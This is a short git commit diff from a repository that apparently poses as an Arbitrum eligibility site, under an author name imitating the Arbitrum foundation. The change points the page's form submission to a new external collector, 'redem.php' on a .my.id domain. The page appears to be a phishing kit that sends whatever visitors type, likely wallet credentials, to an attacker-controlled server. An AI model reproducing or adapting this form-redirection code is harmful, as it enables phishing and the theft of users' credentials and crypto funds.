d4b67b39c1c58cfed855ce8247e5e5c948ac6ddd
arbitrum-foundations <130158792+arbitrum-foundations@users.noreply.github.com>
2023-04-07 21:02:14 +0700

    Update script.js

--- Arbitrum-eligibility/orage/script.js
+++ Arbitrum-eligibility/orage/script.js
@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "https://jinkontot-contole.my.id/reedem.php");
+  $(myform).attr("action", "https://romusa-sabose-santos.my.id/redem.php");
 });
